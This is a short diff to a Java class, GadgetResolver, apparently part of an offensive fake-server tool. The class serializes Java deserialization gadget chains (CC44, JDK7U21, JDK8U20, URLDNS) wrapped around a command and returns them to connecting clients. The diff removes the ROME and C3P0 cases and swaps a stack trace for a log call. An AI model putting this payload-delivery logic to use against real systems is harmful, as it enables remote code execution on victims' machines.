@@ -76,17 +76,11 @@ public class GadgetResolver implements Resolver {
                 case "CC44":
                     data = SerUtil.serializeObject(new CC44().getObject(cmd));
                     break;
-                case "ROME":
-                    data = SerUtil.serializeObject(new Rome().getObject(cmd));
-                    break;
                 case "JDK7U21":
                     data = SerUtil.serializeObject(new JDK7U21().getObject(cmd));
                     break;
                 case "JDK8U20":
                     data = JDK8U20.getObject(cmd);
-                    break;
-                case "C3P0":
-                    data = SerUtil.serializeObject(new C3P0().getObject(cmd));
                     break;
                 case "URLDNS":
                     data = SerUtil.serializeObject(new URLDNS().getObject(cmd));
@@ -110,7 +104,7 @@ public class GadgetResolver implements Resolver {
                     PacketHelper.buildPacket(7, Resp.EOF)));
             outputStream.flush();
         } catch (Exception ex) {
-            ex.printStackTrace();
+            log.error("gadget resolver error: {}",ex.toString());
         }
     }
 }
